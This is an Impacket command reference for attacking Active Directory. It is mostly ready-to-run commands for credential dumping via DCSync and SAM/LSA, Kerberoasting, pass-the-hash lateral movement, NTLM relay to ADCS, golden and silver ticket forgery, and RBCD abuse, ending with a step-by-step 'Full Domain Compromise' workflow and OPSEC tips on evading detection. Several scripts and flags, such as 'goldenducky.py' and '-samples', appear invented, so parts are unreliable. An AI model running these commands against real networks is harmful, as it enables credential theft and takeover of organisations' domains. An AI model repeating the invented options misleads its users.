# <span style="color:rgb(255, 192, 0)">Impacket - Complete Command Reference</span>

**Impacket** by @agsolino (Fortra/SecureAuth) is a collection of Python classes for working with network protocols. The `examples/` directory contains ready-to-use scripts for AD exploitation.

**Installation:**
```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
# Or
sudo apt install impacket-scripts
```

**Auth syntax:** `domain/user:password@target` or `-hashes LM:NTLM` or `-k` (Kerberos)

---

## <span style="color:rgb(255, 0, 0)">1. secretsdump.py</span>

Extracts credentials from Windows systems via SAM, LSA, and NTDS.dit.

### DCSync (Domain Controller)

```bash
# DCSync all users (requires DA/EA/DC sync rights)
secretsdump.py domain/user:pass@dc01.domain.local

# DCSync specific user
secretsdump.py domain/user:pass@dc01.domain.local -just-dc-user krbtgt

# DCSync with NTLM hash (pass-the-hash)
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:NT:HASH domain/user@dc01.domain.local

# DCSync only NTLM hashes (no Kerberos keys)
secretsdump.py domain/user:pass@dc01.domain.local -just-dc-ntlm

# DCSync with Kerberos
secretsdump.py -k domain/user@dc01.domain.local -no-pass

# Output to file
secretsdump.py domain/user:pass@dc01.domain.local -outputfile dcsync_output

# DCSync specific domain (in multi-domain forest)
secretsdump.py domain/user:pass@targetDC -just-dc -target-domain otherdomain.local
```

### SAM & LSA (Local System)

```bash
# Dump SAM (local hashes) - requires admin
secretsdump.py domain/user:pass@target -sam

# Dump LSA secrets
secretsdump.py domain/user:pass@target -lsa

# Dump SAM + LSA
secretsdump.py domain/user:pass@target -sam -lsa

# Extract cached credentials
secretsdump.py -hashes :NTLM domain/user@target -samples
```

### NTDS.dit (Local File)

```bash
# Parse offline NTDS.dit
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL

# With security and boot key
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL

# History and status
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -history -status
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-just-dc` | DCSync (DRSUAPI) |
| `-just-dc-ntlm` | NTLM hashes only from DCSync |
| `-just-dc-user USER` | Single user from DCSync |
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Use Kerberos auth |
| `-no-pass` | Do not ask for password |
| `-outputfile OUT` | Write to files |
| `-sam` | Dump SAM |
| `-lsa` | Dump LSA secrets |
| `-status` | Show extraction status |
| `-history` | Include password history |

---

## <span style="color:rgb(0, 176, 240)">2. GetUserSPNs.py</span>

Kerberoasting - Request TGS for service accounts with SPNs.

```bash
# Basic Kerberoast (all SPN accounts, get TGS)
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request

# Output to file for cracking
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request -outputfile kerberoast.txt

# Specific target user
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request-user svc_account

# Just list SPN accounts (no request)
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1

# With NTLM hash
GetUserSPNs.py -hashes :NTLM domain/user@target -request

# With Kerberos
GetUserSPNs.py -k domain/user@target -no-pass -request

# Print all output (for debugging)
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request -debug

# Save to file format ready for hashcat (mode 13100)
# Output format: $krb5tgs$23$*user$domain$spn*$hash
hashcat -m 13100 kerberoast.txt wordlist.txt

# Save to file format ready for john
john --format=krb5tgs kerberoast.txt --wordlist=wordlist.txt
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-request` | Request TGS tickets |
| `-request-user USER` | Request for specific user |
| `-outputfile OUT` | Write to file |
| `-dc-ip IP` | Domain controller IP |
| `-target-domain DOM` | Specify target domain |
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos auth |
| `-no-pass` | No password prompt |
| `-debug` | Debug output |

---

## <span style="color:rgb(146, 208, 80)">3. GetNPUsers.py</span>

AS-REP Roasting - Request AS-REP for users with Kerberos pre-auth disabled.

```bash
# Single user, no creds required (pre-auth disabled)
GetNPUsers.py domain/ -dc-ip 10.0.0.1 -no-pass

# Users from file (no creds)
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# With credentials (list AS-REP roastable users)
GetNPUsers.py domain/user:pass -dc-ip 10.0.0.1

# Request ticket with creds
GetNPUsers.py domain/user:pass -dc-ip 10.0.0.1 -request

# Output to file (hashcat mode 18200)
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -outputfile asrep.txt
# Format: $krb5asrep$23$*user@domain*$hash

# With Kerberos
GetNPUsers.py -k domain/user@target -no-pass -request

# Including disabled accounts
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -request -disabled

# Format output
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1 -format hashcat
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-request` | Request TGT |
| `-usersfile FILE` | File with usernames (one per line) |
| `-no-pass` | No password |
| `-dc-ip IP` | DC IP address |
| `-outputfile OUT` | Output file |
| `-format {hashcat,john}` | Output format |
| `-disabled` | Include disabled accounts |

---

## <span style="color:rgb(255, 0, 0)">4. psexec.py</span>

Lateral movement via SMB (PsExec implementation).

```bash
# Basic command execution
psexec.py domain/user:pass@target

# With specific command
psexec.py domain/user:pass@target whoami

# Pass-the-hash
psexec.py -hashes :NTLM domain/user@target

# With local auth
psexec.py -hashes :NTLM ./user@target -local-auth

# Specify SMB port
psexec.py domain/user:pass@target -port 445

# Session type
psexec.py domain/user:pass@target -session 1

# Kerberos
psexec.py -k domain/user@target -no-pass whoami

# Debug output
psexec.py domain/user:pass@target -debug

# Powershell output
psexec.py domain/user:pass@target -psexec

# Check if service name is already in use (use different name)
psexec.py domain/user:pass@target -service-name CustomService

# Execute with SYSTEM context
psexec.py domain/user:pass@target -tsystem
```

**Note:** Creates a service on target (`ADMIN$`). Very noisy. Triggers event ID 4697 (service creation), 4688 (process creation), 7045 (service install). Antivirus/EDR will flag.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | NTLM hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-local-auth` | Authenticate as local user |
| `-port PORT` | SMB port |
| `-service-name NAME` | Custom service name |
| `-tsystem` | Run as SYSTEM |

---

## <span style="color:rgb(0, 176, 240)">5. wmiexec.py</span>

Lateral movement via WMI (Win32_Process create). Semi-stealthy.

```bash
# Interactive shell
wmiexec.py domain/user:pass@target

# Execute command
wmiexec.py domain/user:pass@target whoami

# Pass-the-hash
wmiexec.py -hashes :NTLM domain/user@target

# Local auth
wmiexec.py -hashes :NTLM ./user@target -local-auth

# Silent mode (no output banner)
wmiexec.py domain/user:pass@target -silentcommand whoami

# Kerberos
wmiexec.py -k domain/user:pass@target -no-pass

# With debug
wmiexec.py domain/user:pass@target -debug

# Use specific SMB port
wmiexec.py domain/user:pass@target -port 445

# Add COM authentication level
wmiexec.py domain/user:pass@target -com-auth-level 6

# Share (default is ADMIN$)
wmiexec.py domain/user:pass@target -share C$

# Run with interactive shell
wmiexec.py domain/user:pass@target -shell-type powershell
```

**OPSEC:** Uses DCOM (port 135) + SMB. Triggers event 4688 (cmd.exe run by WMIC.exe). Less noisy than psexec.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-local-auth` | Local auth |
| `-silentcommand` | Execute single command, no output |
| `-share SHARE` | SMB share |
| `-shell-type TYPE` | Shell type |
| `-debug` | Debug output |

---

## <span style="color:rgb(146, 208, 80)">6. smbexec.py</span>

Lateral movement via SMB (service control + named pipe).

```bash
# Interactive shell
smbexec.py domain/user:pass@target

# Execute command
smbexec.py domain/user:pass@target whoami

# Pass-the-hash
smbexec.py -hashes :NTLM domain/user@target

# Local auth
smbexec.py -hashes :NTLM ./user@target -local-auth

# Kerberos
smbexec.py -k domain/user@target -no-pass

# Using cmd.exe (default is powershell)
smbexec.py domain/user:pass@target -mode cmd

# Using PowerShell
smbexec.py domain/user:pass@target -mode powershell

# Service name
smbexec.py domain/user:pass@target -service-name Updater

# Quiet mode
smbexec.py domain/user:pass@target -quiet

# Share
smbexec.py domain/user:pass@target -share C$
```

**OPSEC:** Creates service, writes bat/cmd script to ADMIN$ share, executes via SVCCTL. Moderate noise.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-mode {cmd,powershell}` | Shell type |
| `-service-name NAME` | Custom service name |
| `-share SHARE` | SMB share path |
| `-quiet` | Minimize output |
| `-debug` | Debug output |

---

## <span style="color:rgb(255, 0, 0)">7. ntlmrelayx.py</span>

NTLM relay server. Receives incoming NTLM auth attempts and relays them to targets.

```bash
# Basic SMB relay to targets file
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to single target
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# HTTP(S) relay
ntlmrelayx.py -tf targets.txt -smb2support -of outputfile

# ADCS ESC8 relay (HTTP to ADCS Web Enrollment)
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp -adcs -smb2support

# ADCS ESC8 with template selection
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp -adcs -template DomainController

# LDAP relay
ntlmrelayx.py -t ldap://dc01.domain.local

# LDAP relay with user delegation
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access -smb2support

# IMAP relay
ntlmrelayx.py -t imap://target

# SOCKS proxy mode (queue hashes for later use)
ntlmrelayx.py -tf targets.txt -socks -smb2support

# SMB2 only (no SMB1)
ntlmrelayx.py -tf targets.txt -smb2support -no-smb1

# Disable SMB server (only HTTP listener)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -adcs

# Custom port
ntlmrelayx.py -tf targets.txt -smb2support -smb-port 4445

# Multi-relay (try multiple targets)
ntlmrelayx.py -t smb://target1 -t smb://target2 -smb2support

# Interactive mode
ntlmrelayx.py -tf targets.txt -smb2support -i

# Psexec-style after relay (if relay grants admin)
ntlmrelayx.py -tf targets.txt -smb2support -e whoami

# With custom binary to execute
ntlmrelayx.py -tf targets.txt -smb2support -c whoami

# Machine account quota abuse (ESC8)
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -adcs --no-da --no-dhcp
```

### Interacting with SOCKS

```bash
# After ntlmrelayx.py -tf targets.txt -socks -smb2support
# Use ntlmrelayx.py's internal SOCKS to relay

# In another terminal:
nxc smb target -u user -H hash --use-socks
# Or impacket tools with socks:
proxychains secretsdump.py domain/Administrator@target
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-tf FILE` | Targets file (one per line) |
| `-t URL` | Single target (e.g., `smb://host`, `http://host`, `ldap://host`) |
| `-smb2support` | Enable SMB2 |
| `-adcs` | ADCS mode (ESC8) |
| `-template TEMPLATE` | Certificate template |
| `-socks` | SOCKS proxy mode |
| `-of FILE` | Output file |
| `-i` | Interactive shell |
| `-c CMD` | Command to exec |
| `-e FILE` | Executable to run |
| `-no-smb1` | Disable SMB1 |
| `-smb-port PORT` | Custom SMB port |
| `--delegate-access` | LDAP relay with delegation |

---

## <span style="color:rgb(0, 176, 240)">8. ticketer.py</span>

Golden/Silver ticket creation and forgery.

```bash
# Golden ticket (krbtgt hash + domain SID)
ticketer.py -nthash <krbtgt_NT_HASH> -domain-sid S-1-5-21-XXXX -domain domain.local user

# Golden ticket with user RIDs for groups
ticketer.py -nthash <krbtgt_NT_HASH> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -user-id 500 -groups 512,513,518,519,520 Administrator

# Silver ticket (service NTLM hash + target SID)
ticketer.py -nthash <service_NT_HASH> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -spn cifs/target.domain.local Administrator

# Silver ticket for HOST SPN
ticketer.py -nthash <NTLM> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -spn HOST/target.domain.local Administrator

# Silver ticket for LDAP (for DCSync)
ticketer.py -nthash <NTLM> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -spn LDAP/dc01.domain.local Administrator

# Golden ticket with extra SIDs (for SID History abuse)
ticketer.py -nthash <krbtgt_NT_HASH> -domain-sid S-1-5-21-DOMAIN -domain domain.local \
  -extra-sid S-1-5-21-ENTERPRISE-519 Administrator

# With AES key instead of NTLM
ticketer.py -aesKey <AES256_KEY> -domain-sid S-1-5-21-XXXX -domain domain.local Administrator

# Export to ccache file
ticketer.py -nthash <NTLM> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -user-id 500 Administrator -export admin.ccache

# Golden ticket to specific user
ticketer.py -nthash <krbtgt_NT_HASH> -domain-sid S-1-5-21-XXXX -domain domain.local \
  -user-id 500 Administrator
```

**Usage after creation:**
```bash
# Set ticket for use
export KRB5CCNAME=/path/to/ticket.ccache

# Use with Impacket tools
secretsdump.py -k domain/Administrator@dc01.domain.local -no-pass
```

**Key Parameters:**

| Flag | Description |
|------|-------------|
| `-nthash NTLM` | NT hash of account |
| `-aesKey KEY` | AES128/AES256 key |
| `-domain-sid SID` | Domain SID |
| `-domain DOM` | Domain name |
| `-user-id RID` | RID (default 500 for Admin) |
| `-groups RIDs` | Group RIDs (comma-separated) |
| `-spn SPN` | Service Principal Name (silver ticket) |
| `-extra-sid SID` | Extra SID (SID history) |
| `-export FILE` | Export to file |
| `-duration HOURS` | Ticket duration |

---

## <span style="color:rgb(146, 208, 80)">9. getST.py</span>

Request service tickets. Useful for S4U2Self/S4U2Proxy abuse (constrained/unconstrained delegation).

```bash
# Request TGS (standard Kerberos)
getST.py domain/user:pass -spn cifs/target.domain.local

# S4U2Self (impersonate user, for RBCD)
getST.py domain/user:pass -spn cifs/target.domain.local -impersonate Administrator

# S4U2Self + S4U2Proxy (constrained delegation abuse)
getST.py domain/user:pass -spn cifs/target.domain.local -impersonate Administrator \
  -additional-ticket ticket.ccache

# With NTLM hash
getST.py -hashes :NTLM domain/user@target -spn cifs/target.domain.local -impersonate Administrator

# With AES key
getST.py -aesKey <AES256_KEY> domain/user@target -spn cifs/target.domain.local \
  -impersonate Administrator

# Using a TGT (ccache file)
export KRB5CCNAME=/path/to/tgt.ccache
getST.py -k -no-pass domain/user@target -spn cifs/target.domain.local -impersonate Administrator

# Get ST for HTTP SPN (for WinRM)
getST.py domain/user:pass -spn HTTP/target.domain.local -impersonate Administrator

# Get ST for LDAP (DCSync via delegation)
getST.py domain/user:pass -spn LDAP/dc01.domain.local -impersonate Administrator

# Self (S4U2Self), no impersonation needed
getST.py domain/user:pass -spn cifs/target.domain.local -self

# For RBCD (Resource-Based Constrained Delegation)
getST.py domain/user:pass -spn cifs/target.domain.local -impersonate Administrator \
  -altservice ldap

# Alternative service (use ticket for different service)
getST.py domain/user:pass -spn cifs/target.domain.local -impersonate Administrator \
  -altservice cifs,http,host
```

**Typical attack flow:**
```bash
# 1. Find RBCD target
# 2. Request ticket as machine account impersonating admin
getST.py -hashes :MACHINE_NT domain/machine$@target -spn cifs/target.domain.local -impersonate Administrator
export KRB5CCNAME=Administrator.ccache

# 3. Use the ticket for lateral movement
smbexec.py -k -no-pass domain/Administrator@target
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-spn SPN` | Service Principal Name to request |
| `-impersonate USER` | User to impersonate (S4U2Proxy) |
| `-self` | S4U2Self (no forwardable) |
| `-additional-ticket TKT` | Additional TGT/TGS for S4U2Proxy |
| `-altservice SPN` | Alternative service |
| `-aesKey KEY` | AES key |
| `-hashes LM:NTLM` | NTLM hash |
| `-k` | Kerberos auth |
| `-no-pass` | No password |
| `-dc-ip IP` | DC IP |

---

## <span style="color:rgb(255, 0, 0)">10. addcomputer.py</span>

Add a machine account to the domain. Used for RBCD and ADCS attacks.

```bash
# Add computer (SAMR method - default)
addcomputer.py domain/user:pass -method SAMR \
  -computer-name ATTACKER\$ -computer-pass Password123!

# Add computer (LDAP method - needs ms-DS-MachineAccountQuota)
addcomputer.py domain/user:pass -method LDAP \
  -computer-name ATTACKER\$ -computer-pass Password123!

# Specify OU
addcomputer.py domain/user:pass -method LDAP \
  -computer-name ATTACKER\$ -computer-pass Password123! \
  -computer-ou "OU=Computers,DC=domain,DC=local"

# With NTLM hash
addcomputer.py -hashes :NTLM domain/user@target \
  -method SAMR -computer-name ATTACKER\$ -computer-pass Password123!

# With Kerberos
addcomputer.py -k -no-pass domain/user@target \
  -method SAMR -computer-name ATTACKER\$ -computer-pass Password123!

# Delete computer account
addcomputer.py domain/user:pass -method SAMR \
  -computer-name ATTACKER\$ -computer-pass Password123! -delete

# Enable disabled computer account
addcomputer.py domain/user:pass -method SAMR \
  -computer-name ATTACKER\$ -computer-pass Password123! -enable

# Specify domain controller
addcomputer.py domain/user:pass -method SAMR \
  -computer-name ATTACKER\$ -computer-pass Password123! -dc-ip 10.0.0.1

# Very long password (for AES support)
addcomputer.py domain/user:pass -method SAMR \
  -computer-name ATTACKER\$ -computer-pass 'Passw0rd!WithMoreThan14Chars!!'
```

**Note:** Default `ms-DS-MachineAccountQuota` is 10. Domain users can add up to 10 machine accounts by default.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-method {SAMR,LDAP}` | Add computer method |
| `-computer-name NAME` | Computer name (must end with `$`) |
| `-computer-pass PASS` | Computer password |
| `-computer-ou OU_DN` | OU distinguished name |
| `-delete` | Delete computer account |
| `-enable` | Enable computer account |
| `-dc-ip IP` | DC IP |

---

## <span style="color:rgb(0, 176, 240)">11. lookupsid.py</span>

SID brute-force (RID cycling) to enumerate users/groups.

```bash
# Basic SID lookup (will show domain SID + first set of RIDs)
lookupsid.py domain/user:pass@target

# Domain SID only
lookupsid.py domain/user:pass@target 0

# SID lookup starting from specific RID
lookupsid.py domain/user:pass@target 500

# SID lookup range
lookupsid.py domain/user:pass@target 1000-2000

# Pass-the-hash
lookupsid.py -hashes :NTLM domain/user@target

# Kerberos
lookupsid.py -k -no-pass domain/user@target

# Query specific domain SID
lookupsid.py domain/user:pass@target S-1-5-21-XXXX

# Anonymous lookup (null session)
lookupsid.py ''@target

# No pass
lookupsid.py domain/user@target -no-pass

# Debug
lookupsid.py domain/user:pass@target -debug

# Output format
lookupsid.py domain/user:pass@target -format {csv,tsv,list}
```

**RID cycling output example:**
```
[*] RID: 500, Name: Administrator, Type: User
[*] RID: 501, Name: Guest, Type: User  
[*] RID: 502, Name: krbtgt, Type: User
[*] RID: 512, Name: Domain Admins, Type: Group
[*] RID: 513, Name: Domain Users, Type: Group
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-format {csv,tsv,list}` | Output format |
| `-debug` | Debug output |

---

## <span style="color:rgb(146, 208, 80)">12. samrdump.py</span>

Dump SAM/SAMR information (users, groups, shares, domains).

```bash
# Enumerate users via SAMR
samrdump.py domain/user:pass@target

# Specific target domain
samrdump.py domain/user:pass@target -target-domain otherdomain

# Pass-the-hash
samrdump.py -hashes :NTLM domain/user@target

# Kerberos
samrdump.py -k -no-pass domain/user@target

# List only users
samrdump.py domain/user:pass@target -users

# List only groups
samrdump.py domain/user:pass@target -groups

# List only shares
samrdump.py domain/user:pass@target -shares

# List everything
samrdump.py domain/user:pass@target -all

# Anonymous query
samrdump.py ''@target -no-pass

# Output to file
samrdump.py domain/user:pass@target -output-file dump.txt
```

### Key Parameters

| Flag | Description |
|------|-------------|
| `-target-domain DOM` | Domain to query |
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-users` | List only users |
| `-groups` | List only groups |
| `-shares` | List only shares |

---

## <span style="color:rgb(255, 0, 0)">13. reg.py</span>

Remote registry manipulation via SMB.

```bash
# Query registry key
reg.py domain/user:pass@target query -keyName HKLM\\SAM\\SAM\\Domains\\Account\\Users

# Query HKLM key
reg.py domain/user:pass@target query -keyName HKLM\\SYSTEM\\CurrentControlSet\\Services

# Query HKCU
reg.py domain/user:pass@target query -keyName HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# Query with recursive
reg.py domain/user:pass@target query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall -r

# Query value
reg.py domain/user:pass@target getvalue -keyName HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa -v LimitBlankPasswordUse

# Add key
reg.py domain/user:pass@target addkey -keyName HKLM\\Software\\TestKey

# Set value
reg.py domain/user:pass@target setvalue -keyName HKLM\\Software\\TestKey -v Test -t REG_DWORD -d 1

# Delete key
reg.py domain/user:pass@target deletekey -keyName HKLM\\Software\\TestKey

# Delete value
reg.py domain/user:pass@target deletevalue -keyName HKLM\\Software\\TestKey -v Test

# Pass-the-hash
reg.py -hashes :NTLM domain/user@target query -keyName HKLM\\SAM

# Kerberos
reg.py -k -no-pass domain/user@target query -keyName HKLM\\SYSTEM
```

**Use cases:** Extract SAM data, check LSA protection, query autologon creds.

### Key Parameters

| Flag | Description |
|------|-------------|
| `query` | Query a registry key |
| `getvalue` | Get a registry value |
| `addkey` | Add a registry key |
| `setvalue` | Set a registry value |
| `deletekey` | Delete a registry key |
| `deletevalue` | Delete a registry value |
| `-keyName PATH` | Registry key path |
| `-v VALUE` | Value name |
| `-t TYPE` | Value type (REG_SZ, REG_DWORD, etc.) |
| `-d DATA` | Value data |
| `-r` | Recursive |
| `-hashes LM:NTLM` | Pass-the-hash |

---

## <span style="color:rgb(0, 176, 240)">14. rpcdump.py</span>

DCE/RPC endpoint mapper and service enumeration.

```bash
# Enumerate all RPC endpoints
rpcdump.py domain/user:pass@target

# Pass-the-hash
rpcdump.py -hashes :NTLM domain/user@target

# Kerberos
rpcdump.py -k -no-pass domain/user@target

# Port specification
rpcdump.py domain/user:pass@target -port 135

# Specific protocol
rpcdump.py domain/user:pass@target -protocol {ncacn_ip_tcp,ncacn_np}

# Bind to specific interface
rpcdump.py domain/user:pass@target -uuid 12345678-1234-ABCD-EF00-0123456789AB

# Anonymous query
rpcdump.py ''@target -no-pass

# Debug
rpcdump.py domain/user:pass@target -debug
```

**Common RPC interfaces to check:**
- `12345678-1234-ABCD-EF00-0123456789AB` - Security Account Manager (SAMR)
- `3919286a-b10c-11d0-9ba8-00c04fd92ef5` - LSA (Policy)
- `1d55ad0d-7d2b-45e3-b984-e3e6a6f7d2a7` - LSARP

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-port PORT` | Port number |
| `-protocol PROT` | Protocol binding |
| `-uuid UUID` | Interface UUID |
| `-debug` | Debug output |

---

## <span style="color:rgb(146, 208, 80)">15. atexec.py</span>

Lateral movement via Task Scheduler (AT).

```bash
# Execute command
atexec.py domain/user:pass@target cmd.exe /c whoami

# Interactive shell
atexec.py domain/user:pass@target

# Pass-the-hash
atexec.py -hashes :NTLM domain/user@target command

# Local auth
atexec.py -hashes :NTLM ./user@target -local-auth command

# Kerberos
atexec.py -k -no-pass domain/user@target command

# Specific time execution
atexec.py domain/user:pass@target -time "12:30" command

# Execute powershell command
atexec.py domain/user:pass@target powershell.exe -Command "Get-Process"

# With debug
atexec.py domain/user:pass@target -debug command

# With no output (fire and forget)
atexec.py domain/user:pass@target command -silentcommand

# Custom output file
atexec.py domain/user:pass@target -output-file out.txt command
```

**OPSEC:** Creates scheduled task. Triggers event 4698 (task created). Available since Windows 7/2008.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-local-auth` | Local authentication |
| `-time TIME` | Time to execute (24h format) |
| `-silentcommand` | No output |

---

## <span style="color:rgb(255, 0, 0)">16. dcomexec.py</span>

Lateral movement via DCOM (various DCOM classes).

```bash
# MMC20.Application (standard)
dcomexec.py domain/user:pass@target cmd.exe /c whoami

# Interactive shell
dcomexec.py domain/user:pass@target

# ShellBrowserWindow (alternative DCOM object)
dcomexec.py domain/user:pass@target -object MMC20

# Excel.Application DCOM
dcomexec.py domain/user:pass@target -object Excel

# ShellWindows
dcomexec.py domain/user:pass@target -object ShellWindows

# ShellBrowserWindow
dcomexec.py domain/user:pass@target -object ShellBrowserWindow

# Pass-the-hash
dcomexec.py -hashes :NTLM domain/user@target cmd.exe /c whoami

# Local auth
dcomexec.py -hashes :NTLM ./user@target -local-auth cmd.exe /c whoami

# Kerberos
dcomexec.py -k -no-pass domain/user@target cmd.exe /c whoami

# Silent mode
dcomexec.py domain/user:pass@target -silentcommand whoami

# Use debug
dcomexec.py domain/user:pass@target -debug cmd.exe /c whoami
```

**OPSEC:** DCOM abuse. MMC20.Application is commonly monitored. ShellBrowserWindow is stealthier.

### Key Parameters

| Flag | Description |
|------|-------------|
| `-object {MMC20,Excel,ShellWindows,ShellBrowserWindow}` | DCOM object |
| `-hashes LM:NTLM` | Pass-the-hash |
| `-k` | Kerberos |
| `-no-pass` | No password |
| `-local-auth` | Local authentication |
| `-silentcommand` | Silent execution |

---

## <span style="color:rgb(0, 176, 240)">Additional Impacket Scripts</span>

### rpcdump.py
```bash
# Check for MS-EFSR (PetitPotam)
rpcdump.py domain/user:pass@target | grep -i "efsr"
```

### GetADUsers.py
```bash
# Get all domain users
GetADUsers.py domain/user:pass -dc-ip 10.0.0.1 -all
```

### Get-GroupMembership.py
```bash
# Get group members
GetGroupMembership.py domain/user:pass@target "Domain Admins"
```

### findDelegation.py
```bash
# Find delegation configurations
findDelegation.py domain/user:pass@target
```

### GetUserHosts.py
```bash
# Find computers where a user has sessions
GetUserHosts.py domain/user:pass@target
```

### DumpNTLMInfo.py
```bash
# Enumerate SMB signing, SMB version
DumpNTLMInfo.py domain/user:pass@target
```

### netview.py
```bash
# Network session enumeration
netview.py domain/user:pass@target
```

### goldenducky.py
```bash
# Golden ticket (older method, ticketer.py preferred)
goldenducky.py domain/user:pass -domain-sid S-X-X-XX domain/local
```

## <span style="color:rgb(146, 208, 80)">Common Workflows</span>

### Full Domain Compromise
```bash
# 1. Enumerate users via RID cycling
lookupsid.py domain/user:pass@dc 500-2000

# 2. Kerberoast
GetUserSPNs.py domain/user:pass -dc-ip 10.0.0.1 -request

# 3. AS-REP roast
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# 4. DCSync (once DA obtained)
secretsdump.py domain/Administrator:pass@dc01 -just-dc

# 5. Golden ticket
ticketer.py -nthash <krbtgt_NTLM> -domain-sid S-X-X -domain domain.local Administrator
```

### Relay + ADCS
```bash
# 1. Start ntlmrelayx.py
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp -adcs -smb2support

# 2. Coerce auth (PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py attackerIP targetIP
```

### RBCD Attack
```bash
# 1. Add computer (if quota allows)
addcomputer.py domain/user:pass -method SAMR -computer-name ATTACKER\$ -computer-pass Pass

# 2. Set RBCD on target
# Using PowerView or ActiveDirectory module

# 3. Get ticket
getST.py domain/ATTACKER\$:Pass -spn cifs/target.domain.local -impersonate Administrator

# 4. Use it
export KRB5CCNAME=Administrator.ccache
smbexec.py -k -no-pass domain/Administrator@target
```
